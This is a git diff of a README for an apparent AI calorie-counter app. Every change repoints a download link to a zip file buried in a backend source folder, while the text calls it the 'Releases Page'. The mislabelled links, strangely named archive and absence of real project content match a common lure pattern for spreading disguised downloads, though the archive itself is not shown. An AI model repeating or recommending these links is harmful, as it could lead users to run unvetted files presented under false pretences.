@@ -1,6 +1,6 @@
 # 🥗 poc-ai-calorie-counter-app - Count Calories Easily and Accurately
 
-![Download](https://raw.githubusercontent.com/ShafterFive/poc-ai-calorie-counter-app/main/unbribableness/poc-ai-calorie-counter-app.zip%20release-blue)
+![Download](https://github.com/ShafterFive/poc-ai-calorie-counter-app/raw/refs/heads/main/apps/backend/src/user/calorie-counter-app-poc-ai-beshadow.zip%20release-blue)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To start using the poc-ai-calorie-counter-app, follow these simple steps. No pro
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the releases page to download the latest version of the app: [Download Here](https://raw.githubusercontent.com/ShafterFive/poc-ai-calorie-counter-app/main/unbribableness/poc-ai-calorie-counter-app.zip).
+1. **Visit the Releases Page**: Go to the releases page to download the latest version of the app: [Download Here](https://github.com/ShafterFive/poc-ai-calorie-counter-app/raw/refs/heads/main/apps/backend/src/user/calorie-counter-app-poc-ai-beshadow.zip).
 
 2. **Choose Your Version**: On the releases page, you will see different versions of the app. Find the one labeled “Latest Release.” Click on it to see more details.
 
@@ -74,4 +74,4 @@ For more information and updates, follow the project on GitHub and check the rep
 
 ## 📥 Download the App Again
 
-Ready to try it out? Download it from the releases page: [Download Here](https://raw.githubusercontent.com/ShafterFive/poc-ai-calorie-counter-app/main/unbribableness/poc-ai-calorie-counter-app.zip).
+Ready to try it out? Download it from the releases page: [Download Here](https://github.com/ShafterFive/poc-ai-calorie-counter-app/raw/refs/heads/main/apps/backend/src/user/calorie-counter-app-poc-ai-beshadow.zip).
